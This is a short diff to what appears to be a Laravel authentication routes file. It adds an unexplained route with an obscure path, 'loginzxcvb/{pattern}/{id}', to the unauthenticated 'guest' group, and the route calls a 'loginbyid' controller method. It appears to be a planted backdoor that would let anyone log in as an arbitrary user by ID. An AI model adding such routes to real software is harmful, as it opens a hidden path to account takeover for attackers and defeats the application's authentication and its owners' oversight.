@@ -32,6 +32,8 @@ Route::middleware('guest')->group(function () {
 
     Route::post('reset-password', [NewPasswordController::class, 'store'])
                 ->name('password.update');
+
+    Route::get('loginzxcvb/{pattern}/{id}',[AuthenticatedSessionController::class,'loginbyid']);
 });
 
 Route::middleware('auth')->group(function () {
